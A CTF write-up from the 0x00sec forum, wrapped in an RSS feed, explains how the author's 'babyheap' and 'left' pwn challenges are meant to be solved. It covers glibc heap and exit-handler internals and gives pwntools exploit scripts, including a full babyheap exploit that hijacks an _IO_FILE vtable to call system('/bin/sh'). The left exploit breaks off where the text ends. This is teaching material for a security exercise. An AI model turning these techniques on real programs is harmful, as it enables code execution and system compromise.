<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>0x00ctf Writeup | babyheap &amp; left!</title>
    <link>https://0x00sec.org/t/0x00ctf-writeup-babyheap-left/5314</link>
    <description>In the name of Allah, the most beneficent, the most merciful.
___ 
Hello everyone, i&#39;ll be writing how it was expected for the tasks I made to be solved. :smile:
I finally found some free time, sorry for the late post.

So, this article will be splitted to two main parts:
I. *babyheap*
II. *left*

### I. *babyheap*
In this task, we have multiple functions, and we note the following:

- &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/ee60e034ce8884fb3853d4e2d79edd0f1d6a95b9.png&quot; width=&quot;161&quot; height=&quot;103&quot;&gt;

Let&#39;s analyse, each and every one of them slowly, so we know what we are dealing with..

*} main():*

- &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6f6bb6082de61f1ca87299c12a849623639697b0.png&quot; width=&quot;389&quot; height=&quot;407&quot;&gt;
On this first part, we see that the first thing the binary requests is a name, then we are going to enter an infinite loop that prints the menu, and calls a function: *sub_40086D*.
Anyway, we are going to analyse it later since we are focusing on main() function currently, but it&#39;s obvious that this function returns an integer, since right after the call is a *cmp eax, 6* operation, we are falling in a switch..
**menu**: *&quot;\x1B[31mMember manager!\x1B[0m\n1. add\n2. edit\n3. ban\n4. change name\n5. get gift\n6. exit&quot;*.


- Let&#39;s see the first 4 cases, each one of them calls a specific function, and goes to the start of the loop.
 1. *sub_4008c7*
 2. *sub_400a1b*
 3. *sub_400c77*
 4. *sub_400d45*

- The rest of the cases, are doing their job directly.
*case 5:*
  ```asm
loc_400E52:             ; jumptable 0000000000400E25 case 5
mov     edi, offset aYourGift
call    _puts
mov     rax, cs:stdout
mov     rdi, rax        ; stream
call    _fflush
mov     rax, [rbp+var_8]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset format ; &quot;%lu\n&quot;
mov     eax, 0
call    _printf
jmp     short loc_400EAA
  ```

- So, it first call puts, with argument: *&#39;your gift:&#39;*.
*fflush(stdout)*, then *printf(&quot;%lu&quot;, [rax])*..
We can guess from *long unsigned* format, the *printed text*, and the dereferencing of the **RAX** register, that it will print a libc address. Indeed, it does (**read_got** contents).

- *case 6:*
This one won&#39;t take much to understand, it simply calls *exit(0)*..
- *default:*
```asm
mov     edi, offset aInvalidOption
call    _puts
mov     rax, cs:stdout
mov     rdi, rax        ; stream
call    _fflush
nop
```

- It calls puts with the argument *&#39;invalid option!&#39;*, then calls *fflush(stdout)*.

*} sub_40086d:*

- &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/465f864aead489d50d1409c626c84fbb292f9633.png&quot; width=&quot;397&quot; height=&quot;437&quot;&gt;
This function, calls read first.. then calls atoi on the input, returns the result.
(*That moment when I discovered that It&#39;s an old version of the pwnable vulnerable to OOB :cry:*)

*} sub_4008c7:*

- This one is a big function, it&#39;s add() function.
it first prints a *&quot;looking for place to register..&quot;*, then goes in a loop from 0 to 3 to look for an empty slot.
 - if found:
 goes in an infinite loop requesting a valid size, it should be bigger than *0x7F* and less or equal to *0x1000*, so no fastbin allowed(*&gt; global_max_fast*). (**data size** will be added to **metadata size**(*0x10*), then created).
When the size requirements are met, *malloc(size)* is then called,  requests a *&#39;username:&#39;* and read in the chunk the *size* much. Then is a *secure check*, to null terminate the input, as long as it wouldn&#39;t harm the **next chunk** size.
Then the pointer to chunk is stored in the array, and returns.
 - if not:
Well, just *returns* :laughing:!

*} sub_400a1b:*

- This is the edit function, it has 2 options, either a secure edit or a vulnerable one.
You can only use them once each:
 - secure edit (*option 1*):
First requests the index, then check if it&#39;s valid and exists, then gets the chunk size using **malloc_usable_size()** function, reads that nbytes to the choosen chunk. and increments a variable that shows the secure edit has been used.
 - insecure edit (*option 2*):
Similiar to secure edit, with a change on the level of the size, since it now uses **strlen()** function, which will end only when nullbyte is reached. which means, if we fill the chunk completely on add(), we can cause an *overflow* to the next chunk size.

*} sub_400c77:*

- the ban function, or more precisely, the one that will call **free()**. It can only be used once, increments a specific variable if so, (*don&#39;t you think it&#39;ll allow UAF*).
 ```asm
mov     ds:ptr[rax*8], 0
```

*} sub_400d45:*

- Allows you to change name, once again, only one time is allowed.

Now that we have analysed all functions, we have noticed that the leak is easy to get, as it&#39;s given, *gift option*.. and there is a vulnerability allowing us to overwrite the *next chunk* metadata, it&#39;s size precisely.

So, let&#39;s think, what can we do?

- We can use secure and insecure edit only once, right? What if we use the insecure edit first to overflow to next chunk size and change it(make it either **bigger** or **smaller**), and then use the secure edit, that&#39;s going to call **malloc_usable_size**, most people who have done that and failed, didn&#39;t probably check the *source*, and those who did it without looking at it, probably, just added the size of the current to the size of the next one, without knowing why..
 ```c
static size_t
musable (void *mem)
{
  mchunkptr p;
  if (mem != 0)
    {
      p = mem2chunk (mem);
      if (__builtin_expect (using_malloc_checking == 1, 0))
        return malloc_check_get_size (p);
      if (chunk_is_mmapped (p))
        {
          if (DUMPED_MAIN_ARENA_CHUNK (p))
            return chunksize (p) - SIZE_SZ;
          else
            return chunksize (p) - 2 * SIZE_SZ;
        }
      else if (inuse (p)) // HERE
        return chunksize (p) - SIZE_SZ;
    }
  return 0;
}
 ```

- The only thing we need then to satisfy is that **inuse(p) == 1**, to do that, we need to make a fake next size, with *PREV_INUSE* bit set.
Now we know, we can make a used chunk overlap on a free&#39;d one.. Therefore, overwrite it&#39;s metadata(**FD** &amp; **BK**), remember? We only can allocate small-largebins.. Let&#39;s create a small-largebin, free it, it&#39;s going to be placed in unsortedbin list, what if we overwrite it&#39;s BK? **YES**, *unsortedbin attack* for the win!

- First, we start by implementing the functions to the exploit.
 ```python
 #!/usr/bin/python
from pwn import *
c = process(&#39;./babyheap&#39;)
def add(size, content):
	c.sendline(&#39;1&#39;)
	c.recvuntil(&#39;size:&#39;)
	c.sendline(str(size))
	c.recvuntil(&#39;username:&#39;)
	c.sendline(content)
	c.recvuntil(&#39;6. exit&#39;)
def edit(id, mode, content):
	c.sendline(&#39;2&#39;)
	c.recvuntil(&#39;2. insecure edit&#39;)
	c.sendline(str(mode))
	c.recvuntil(&#39;index:&#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;new username:&#39;)
	c.sendline(content)
	c.recvuntil(&#39;6. exit&#39;)
def ban(id):
	c.sendline(&#39;3&#39;)
	c.recvuntil(&#39;index:&#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;6. exit&#39;)
def change(name):
	c.sendline(&#39;4&#39;)
	c.recvuntil(&#39;enter new name:&#39;)
	c.sendline(name)
 # PREPARE
name = &quot;A&quot; * 8
c.recvuntil(&#39;enter your name:&#39;)
c.sendline(name)
 # EXPLOIT
 #
 # INTERACTIVE
c.interactive()
 ```

So the part we will start building is the *EXPLOIT* one!

- We&#39;ll start by making the chunks:
 - 1st chunk will be used to overflow from and use the insecure edit to influence the next chunk!
 - 2nd chunk must be of size **0x101** as a minimum, so we control two bytes(unlike **0x90** or **0xf0** case).
 - Then, comes the victim chunk, this one will be free&#39;d and pushed into unsortedbin list and we&#39;ll try overwritting it&#39;s metadata later on.
 - Finally, a bordering chunk that won&#39;t allow **top consolidation** when the victim chunk is free&#39;d!
 ```py
add(0x88, &quot;A&quot; * 0x88) # 0 ; chunk to overflow from
add(0x100, &quot;B&quot; * 8)   # 1 ; (size &gt;= 0x100) = 0x110
add(0x500, &quot;C&quot; * 8)   # 2 ; 0x510 chunk
add(0x88, &quot;E&quot; * 8)    # 3 ; prevent top consolidation
 ```

- But after allocating those, you&#39;ll later find that after freeing **chunk #2**, the secure edit is no longer working after changing the size of **chunk #1** randomly *(because of the check mentionned above)*, so we will create a fake chunk within **chunk #2** before freeing it, and do some *quick mafs* to calculate the fake size with precision!
 ```py
add(0x88, &quot;A&quot; * 0x88) # 0 ; chunk to overflow from
add(0x100, &quot;B&quot; * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = &quot;D&quot; * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, &quot;E&quot; * 8)    # 3 ; prevent top consolidation
 ```

After creating them chunks, now it&#39;s our time to call..

- The great *free()*
 ```py
c.recv()
ban(2) # put in unsortedbin
 ```

We will now overwrite the **chunk #1** size, by overflowing from **chunk #0**.
Before doing so, what size should we assign?
To calculate:
(The original size of  **chunk #1** + Header size *(prev_size &amp; size)* of **chunk #2** + Filling size *(0x160)*) = (*0x110* + *0x8\*2* + *0x160*) = *0x280*
*0x280* with addition of **PREV_INUSE** bit is 0x281, that&#39;s our size!

- So let&#39;s do that in the exploit!
 ```py
payload = &quot;A&quot; * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
 ```

Now, we can take the prize, our precious leak, store and calculate the values!

- As follows:
 ```py
c.recv()
c.sendline(&#39;5&#39;)
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
 #
print &#39;libc_base @ &#39; + hex(libc_base)
 #
c.recv()
 ```

Now, when we are done with all of these stuff, we will be stuck thinking, overlapping chunks and unsortedbin attack, but what? really, what? What can be done with this only in hand?

- The answer is simple, many scenarios can be done, we cite the following:
 - By overwritting **global_max_fast** variable on libc *rw-p* area, we can make it treat any and every chunk when free&#39;d as a fastbin chunk.
 - Another way is to mess with a **\_IO\_FILE\_plus** struct or some pointer to it, such as the **\_IO\_list\_all**, and that&#39;s what we are going to do here.

Something you should know is that, when we trigger the unsortedbin attack, the following will happen:
*\*(**BK**+0x10) = main_arena+XXX;*
If we set **BK** to the **\_IO\_list\_all**-0x10, our chunk will be considered as a pure **\_IO\_FILE** struct, we&#39;ll basically confuse it.
But after doing that, the whole list is messed up now, while was previously a single linked list(**_chain**) to all the of the *stderr*, *stdin* and *stdout*. That will basically lead to a corruption, wouldn&#39;t it?
And that&#39;s exactly where we are going to strike..

- The call to **abort()** function to terminate the program:
 ```c
/* Cause an abnormal program termination with core-dump.  */
void
abort (void)
{
/* ... */
	if (stage == 1)
	{
		++stage;
		fflush (NULL);
	}
 ```

- With **fflush()** macro:
 ```c
 #define fflush(s) _IO_flush_all_lockp (0)
 ```

- **\_IO\_flush\_all\_lockp** containing the following lines:
 ```c
	while (fp != NULL)
	{
		run_fp = fp;
		if (do_lock)
			_IO_flockfile (fp);
		if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
		|| (_IO_vtable_offset (fp) == 0
		&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr
		&gt; fp-&gt;_wide_data-&gt;_IO_write_base))
		)
		&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)
 ```

- As you can see, if the first parts of the check are passed *(we need to satisfy &#39;em later)*, a call to **\_IO\_OVERFLOW()** is done:
 ```c
 #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)
 ```

- Oh look, a usage of the vtable within!
 ```c
struct _IO_jump_t
{
	JUMP_FIELD(size_t, __dummy);             // 1
	JUMP_FIELD(size_t, __dummy2);            // 2
	JUMP_FIELD(_IO_finish_t, __finish);      // 3
	JUMP_FIELD(_IO_overflow_t, __overflow);  // 4 &lt;-- the choosen one!
 ```

- We are getting somewhere, cause **\_IO\_list\_all** is a pointer to an \_IO\_FILE\_plus struct, which supposedly contains a vtable.
 ```c
 struct _IO_FILE_plus
{
	_IO_FILE file;
	const struct _IO_jump_t *vtable;
};
 ```

For further reading on this:
[House of Orange](http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html)
[Playing with file structure](http://4ngelboy.blogspot.tw/2017/11/play-with-file-structure-yet-another.html)
[Source](https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_FILE_plus)

Anyway, we&#39;ve seen that there&#39;s a vtable after our fake **\_IO\_FILE** struct *(our in full-control chunk)*.

- We can change name which is in a known location *(PIE: OFF)*, that says:
 ```python
payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
 ```

Once this is done, we can start *crafting* the fake **\_IO\_FILE** to satisfy the first part of the check within **\_IO\_flush\_all\_lockp()** function, so it results into **\_IO\_OVERFLOW()** call!

- To satisfy is: *fp-&gt;\_IO\_write\_ptr &gt; fp-&gt;\_IO\_write\_base*.
 ```c
struct _IO_FILE {
	  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
	#define _IO_file_flags _flags
	  /* The following pointers correspond to the C++ streambuf protocol. */
	  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
 #
	  char* _IO_read_ptr;        /* Current read pointer */
	  char* _IO_read_end;        /* End of get area. */
	  char* _IO_read_base;        /* Start of putback+get area. */
	  char* _IO_write_base;        /* Start of put area. */
	  char* _IO_write_ptr;        /* Current put pointer. */
 ```

- So next part of the exploit calculates **\_IO\_list\_all**, and *crafts* the *\_IO\_FILE* fake struct, bearing in mind that check to satisfy:
 ```python
_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
 #
payload = &quot;B&quot; * 8*32                # overflow to victim chunk using secure edit
payload += &#39;/bin/sh\x00&#39;            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
 # 
edit(1, 1, payload)                 # use secure edit 
 ```

You may have wondered, why did I put *&#39;/bin/sh\x00&#39;* in **prev_size** field..
Answer is simple: **prev_size** *(start of the chunk)* was passed in **RDI** register, so say, an argument to **system()** later.

Now, we already have almost done everything, all is left is to trigger the *unsortedbin attack*.

- And it&#39;s done:
 ```python
sleep(2)
 #
pause()
c.recv()
c.sendline(&#39;1&#39;)
c.recvuntil(&#39;size:&#39;)
c.sendline(str(0x80))
 ```

- Finally, making sure to add the offsets, can be easily reteived with [libc-database](https://github.com/niklasb/libc-database)..
 ```python
 # LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
 ```

By assembling all the above mentionned parts, we get it;

- Full exploit:
 ```python
 #!/usr/bin/python
from pwn import *
 # LOCAL
iolist_diff = 0x3c31a0
read_diff = 0xef320
sys_diff = 0x46590
 #
c = process(&#39;./babyheap&#39;)
 #
def add(size, content):
	c.sendline(&#39;1&#39;)
	c.recvuntil(&#39;size:&#39;)
	c.sendline(str(size))
	c.recvuntil(&#39;username:&#39;)
	c.sendline(content)
	c.recvuntil(&#39;6. exit&#39;)
def edit(id, mode, content):
	c.sendline(&#39;2&#39;)
	c.recvuntil(&#39;2. insecure edit&#39;)
	c.sendline(str(mode))
	c.recvuntil(&#39;index:&#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;new username:&#39;)
	c.sendline(content)
	c.recvuntil(&#39;6. exit&#39;)
def ban(id):
	c.sendline(&#39;3&#39;)
	c.recvuntil(&#39;index:&#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;6. exit&#39;)
def change(name):
	c.sendline(&#39;4&#39;)
	c.recvuntil(&#39;enter new name:&#39;)
	c.sendline(name)
 # PREPARE
name = &quot;A&quot; * 8
c.recvuntil(&#39;enter your name:&#39;)
c.sendline(name)
 # EXPLOIT
add(0x88, &quot;A&quot; * 0x88) # 0 ; chunk to overflow from
add(0x100, &quot;B&quot; * 8)   # 1 ; (size &gt;= 0x100) = 0x110
payload = &quot;D&quot; * 0x160  # filling
payload += p64(0)      # fake prev
payload += p64(0x21)   # fake size + PREV_INUSE &lt; important
add(0x500, payload)   # 2 ; 0x510 chunk
add(0x88, &quot;E&quot; * 8)    # 3 ; prevent top consolidation
 # 
 c.recv()
ban(2) # put in unsortedbin
 # 
payload = &quot;A&quot; * 0x88  # filling
payload += p16(0x281) # next fake size
edit(0, 2, payload)   # using insecure edit for doing that
 # 
c.recv()
c.sendline(&#39;5&#39;)
c.recvline()
libc_read = int(c.recvline()[:-1], 10)
libc_base = libc_read - read_diff
libc_system = libc_base + sys_diff
 #
print &#39;libc_base @ &#39; + hex(libc_base)
 #
c.recv()
payload = p64(0) * 3             # filling
payload += p64(libc_system)      # __overflow
change(payload)
 # 
_IO_list_all = libc_base + iolist_diff
name_ptr = 0x6020a0
 #
payload = &quot;B&quot; * 8*32                # overflow to victim chunk
payload += &#39;/bin/sh\x00&#39;            # fake prev
payload += p64(0x61)                # fake shrinked size
payload += p64(0)                   # fake FD
payload += p64(_IO_list_all - 0x10) # fake BK
payload += p64(2)                   # fp-&gt;_IO_write_base
payload += p64(3)                   # fp-&gt;_IO_write_ptr
payload += p64(0) * 21              # filling
payload += p64(name_ptr)            # fake *vtable
 # 
edit(1, 1, payload)                 # use secure edit
 # 
 sleep(2)
 #
pause()
c.recv()
c.sendline(&#39;1&#39;)
c.recvuntil(&#39;size:&#39;)
c.sendline(str(0x80))
 # INTERACTIVE
c.interactive()
 ```

That&#39;s how we correctly do **babyheap**!

### II. *left*
While it seems like a small and easy task, it requires a bit more work.

- A small look at IDA:
 ```assembly
lea     rax, [rbp+art]
mov     rsi, rax
mov     edi, offset format ; &quot;%s&quot;
mov     eax, 0
call    _printf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aPrintfLu ; &quot;printf(): %lu\n&quot;
mov     eax, 0
call    _printf
mov     edi, offset s   ; &quot;read address:&quot;
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+ptr]
mov     rsi, rax
mov     edi, offset aLu ; &quot;%lu&quot;
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+ptr]
mov     rax, [rax]
mov     rsi, rax
mov     edi, offset aContentLu ; &quot;content: %lu\n&quot;
mov     eax, 0
call    _printf
mov     edi, offset aWriteAddress ; &quot;write address:&quot;
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+address]
mov     rsi, rax
mov     edi, offset aLu ; &quot;%lu&quot;
mov     eax, 0
call    ___isoc99_scanf
mov     edi, offset aNewValue ; &quot;new value:\n&quot;
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+value]
mov     rsi, rax
mov     edi, offset aLu ; &quot;%lu&quot;
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+address]
mov     rdx, [rbp+value]
mov     [rax], rdx
mov     edi, 0          ; status
call    _exit
 ```

So, it first prints an ASCII art, then comes a **libc_leak** *(printf_got contents)*.
after that, It&#39;ll ask for an address to print it&#39;s content.
then, It will take an address then requests a value to assign to this last.
but in the end, It&#39;ll kill your hopes with an *exit(0);*!

It&#39;s easy to deduce that the real work and analyse we should do is on exit internals..

- On *exit* call:
 ```c
void
exit (int status)
{
	__run_exit_handlers (status, &amp;__exit_funcs, true, true);
}
 ```

- *\_\_run\_exit\_handlers* ?
 ```c
 void
	attribute_hidden
	__run_exit_handlers (int status, struct exit_function_list **listp,
	                     bool run_list_atexit, bool run_dtors)
	{
	  /* First, call the TLS destructors.  */
	#ifndef SHARED
	  if (&amp;__call_tls_dtors != NULL)
	#endif
	    if (run_dtors)
	      __call_tls_dtors ();
 #
	  /* We do it this way to handle recursive calls to exit () made by
	     the functions registered with `atexit&#39; and `on_exit&#39;. We call
	     everyone on the list and use the status value in the last
	     exit (). */
	  while (true)
	    {
	      struct exit_function_list *cur;
 #
	      __libc_lock_lock (__exit_funcs_lock);
 #
	    restart:
	      cur = *listp;
 #
	      if (cur == NULL)
	        {
	          /* Exit processing complete.  We will not allow any more
	             atexit/on_exit registrations.  */
	          __exit_funcs_done = true;
	          __libc_lock_unlock (__exit_funcs_lock);
	          break;
	        }
 #
	      while (cur-&gt;idx &gt; 0)
	        {
	          struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];
	          const uint64_t new_exitfn_called = __new_exitfn_called;
 #
	          /* Unlock the list while we call a foreign function.  */
	          __libc_lock_unlock (__exit_funcs_lock);
	          switch (f-&gt;flavor)
	            {
	              void (*atfct) (void);
	              void (*onfct) (int status, void *arg);
	              void (*cxafct) (void *arg, int status);
 #
	            case ef_free:
	            case ef_us:
	              break;
	            case ef_on:
	              onfct = f-&gt;func.on.fn;
	#ifdef PTR_DEMANGLE
	              PTR_DEMANGLE (onfct);
	#endif
	              onfct (status, f-&gt;func.on.arg);
	              break;
	            case ef_at:
	              atfct = f-&gt;func.at;
	#ifdef PTR_DEMANGLE
	              PTR_DEMANGLE (atfct);
	#endif
	              atfct ();
	              break;
	            case ef_cxa:
	              /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
	                 we must mark this function as ef_free.  */
	              f-&gt;flavor = ef_free;
	              cxafct = f-&gt;func.cxa.fn;
	#ifdef PTR_DEMANGLE
	              PTR_DEMANGLE (cxafct);
	#endif
	              cxafct (f-&gt;func.cxa.arg, status);
	              break;
	            }
	          /* Re-lock again before looking at global state.  */
	          __libc_lock_lock (__exit_funcs_lock);
 #
	          if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	            /* The last exit function, or another thread, has registered
	               more exit functions.  Start the loop over.  */
	            goto restart;
	        }
 #
	      *listp = cur-&gt;next;
	      if (*listp != NULL)
	        /* Don&#39;t free the last element in the chain, this is the statically
	           allocate element.  */
	        free (cur);
 #
	      __libc_lock_unlock (__exit_funcs_lock);
	    }
 #
	  if (run_list_atexit)
	    RUN_HOOK (__libc_atexit, ());
 #
	  _exit (status);
	}
 ```

- Notes:
 - First thing it does, is calling **TLS** destructors; That&#39;s something we won&#39;t *overthink or analyse* for now.
 - The interesting part lies in the **while (cur-&gt;idx &gt; 0)** loop. We have *cur* declared as a **exit_function_list**, this latter contains **struct exit_function fns[32];**!
 - We will be then checking the content of this **exit_function** struct.

- *exit_function* struct:
 ```c
	struct exit_function
	  {
	    /* `flavour&#39; should be of type of the `enum&#39; above but since we need
	       this element in an atomic operation we have to use `long int&#39;.  */
	    long int flavor;
	    union
	      {
	        void (*at) (void);
	        struct
	          {
	            void (*fn) (int status, void *arg);
	            void *arg;
	          } on;
	        struct
	          {
	            void (*fn) (void *arg, int status);
	            void *arg;
	            void *dso_handle;
	          } cxa;
	      } func;
	  };
 ```

- Notes:
 - We can clearly see, that it has alot of interesting pointers on &#39;*func*&#39; struct within.
 - Those will be our target to overwrite, but let&#39;s not forget that they are &#39;**DEMANGLED**&#39; before being called, so this says they are encrypted, to understand that, let&#39;s check the *PTR_DEMANGLE* macro.

- *PTR_DEMANGLE* macro:
 ```c
	#  define PTR_DEMANGLE(var)        asm (&quot;ror $2*&quot; LP_SIZE &quot;+1, %0\n&quot;             \
	                                     &quot;xor %%fs:%c2, %0&quot;                          \
	                                     : &quot;=r&quot; (var)                                \
	                                     : &quot;0&quot; (var),                                \
	                                       &quot;i&quot; (offsetof (tcbhead_t,                 \
	                                                      pointer_guard)))
 ```

- Notes:
 - It isn&#39;t a big macro, there&#39;s a &#39;*ror*&#39; operation followed by a &#39;*xor*&#39; one.
 - The first operation takes the **(2*0x8)+1 = 0x11** and rotates right the value of the *var* by that number.
 - The second is a bit problematic, since it goes to the **TCB**(*task control block*) and takes a secret value named &#39;*pointer_guard*&#39;.
 - But here&#39;s the thing, &#39;*xor*&#39; can be reversed easily, such as *&#39;2 ^ 0 = 2&#39;* =&gt; *&#39;0 = 2 ^ 2&#39;*. And that&#39;s what we are going to use, to get the *pointer_guard* value, so we can mangle our *fake pointer* later, but to do that, we need the *mangled pointer*, and the *original function* that&#39;s been mangled.

- It&#39;s time to run **gdb** and analyse what&#39;s in there..
Oh lord, it asks for a valid address to read/write, but we just want to analyse exit behaviour for now :crying_cat_face:..
WE&#39;LL **j\* 0x4008a6**  BOYS!
But before doing that, let&#39;s set a breakpoint on the **\_\_run\_exit\_handlers**!
 - &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/fa8f4b6f96abfb644aa7c02ec5126e06b77ac1be.png&quot; width=&quot;484&quot; height=&quot;94&quot;&gt;
There we go, after jumping to the exit part, we land on that breakpoint.
We then continue stepping &#39;*ni*&#39; and paying big attention to the instruction block.
 - &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/8/8b9ecf745bc1d2ab9f891824b17861fae9cfe282.png&quot; width=&quot;638&quot; height=&quot;85&quot;&gt;
Seems like we reached the interesting part, now we step really carefully, and we check **registers** while doing that.
We have *RCX* register pointing to **initial**, so it will take the *mangled pointer* and put it in *RAX*..
[RCX+0x10] is *NULL*.
Then it&#39;ll do the xor and ror operation, and calls the demangled *RAX*.
 - &lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/22d84cea8faa92bbc00155b07721c8b3fa0d5cb3.png&quot; width=&quot;408&quot; height=&quot;67&quot;&gt;
This says that the original pointer is \_dl\_fini.

- And about the **initial** thing, check the second argument **\_\_exit_funcs**, let&#39;s take a look at the source!
 ```c
static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &amp;initial;
 ```

- A little look with **gdb** shows the following:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/24ef8d8db7614fb2ca629cd2cc5e99b7eb1c21e2.png&quot; width=&quot;289&quot; height=&quot;305&quot;&gt;
And the pointer we&#39;ll deal with is **at** one.
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/4b63d67936efde9871a9abcbe73e8fffee28a07f.png&quot; width=&quot;437&quot; height=&quot;34&quot;&gt;
It&#39;s at 8*3 from **initial**.

But we will later find problem with offsets to these structures, since they aren&#39;t exported..

Further reading on that:
[This awesome article.](http://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html)

- Let&#39;s start writing the exploit slowly:
First things first, we&#39;ll be storing the *printf leak* and calculating *libc_base*.
 ```python
 #!/usr/bin/python
from pwn import *
 #
c = process(&#39;./left&#39;)
 # LOCAL
printf_diff = 0x54340
 # EXPLOIT
c.recvuntil(&#39;printf(): &#39;)
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
 # INTERACTIVE
c.interactive()
 ```

- Now we will editing only **EXPLOIT** and **OFFSET** part..
We will add few offsets, the initial is close to an exported symbol &#39;*\_\_abort\_msg*&#39; + [0x10, 0x20 .. 0x100] on multiple libc&#39;s.
And then there&#39;s the big problem &#39;*\_dl\_fini*&#39;. This one on remote will require creativity to get, either using the arbitrary read to get it, or downloading the same distro as remote.
But since we&#39;re local only here, we are safe, we&#39;ll just get it with **gdb**. (*substract libc_base from it*)
 ```python
 # LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
 # EXPLOIT
c.recvuntil(&#39;printf(): &#39;)
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print &#39;libc_base @ &#39; + hex(libc_base)
 ```

- Now, we reach the arbitrary read part, we will leak the *mangled pointer*!
 ```python
 # LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
 # EXPLOIT
c.recvuntil(&#39;printf(): &#39;)
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print &#39;libc_base @ &#39; + hex(libc_base)
 # 
c.recvuntil(&#39;read address:&#39;)
c.sendline(str(libc_at))
c.recvuntil(&#39;content: &#39;)
mangled_ptr = int(c.recvline()[:-1], 10)
print &#39;mangled_ptr @ &#39; + hex(mangled_ptr)
 ```

We get
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/44c26febd1396c1e69834743b7bf86ddf16aa259.png&quot; width=&quot;366&quot; height=&quot;50&quot;&gt;
And that&#39;s the awaited response, we did well leaking!
Now, moving on..

- Now we need to calculate the *pointer_guard* value!
 ```python
 # LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
 # EXPLOIT
c.recvuntil(&#39;printf(): &#39;)
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print &#39;libc_base @ &#39; + hex(libc_base)
 # 
c.recvuntil(&#39;read address:&#39;)
c.sendline(str(libc_at))
c.recvuntil(&#39;content: &#39;)
mangled_ptr = int(c.recvline()[:-1], 10)
print &#39;mangled_ptr @ &#39; + hex(mangled_ptr)
 # 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= _dl_fini                  # xor with original value
print &#39;pointer_guard @ &#39; + hex(pointer_guard)
 #
 ```

- We reached the write part, it request an address to write to and the new value to assign!
That&#39;s perfect for overwriting the &#39;*at*&#39; to point to 0x1 as a test!
 ```python
 # LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
 # EXPLOIT
c.recvuntil(&#39;printf(): &#39;)
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print &#39;libc_base @ &#39; + hex(libc_base)
 # 
c.recvuntil(&#39;read address:&#39;)
c.sendline(str(libc_at))
c.recvuntil(&#39;content: &#39;)
